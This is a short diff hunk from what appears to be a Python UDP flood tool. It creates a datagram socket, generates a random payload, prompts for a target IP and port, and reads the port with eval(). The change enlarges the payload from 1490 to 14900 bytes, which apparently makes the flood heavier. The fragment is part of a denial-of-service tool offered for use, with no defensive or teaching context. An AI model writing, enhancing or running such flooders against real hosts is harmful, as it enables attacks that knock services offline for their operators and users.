@@ -21,7 +21,7 @@ print('''
 # Create a UDP socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-bytes = random._urandom(1490)
+bytes = random._urandom(14900)
 
 ip = input("[+] ENTER TARGET IP: ")
 port = eval(input("[+] PORT: "))
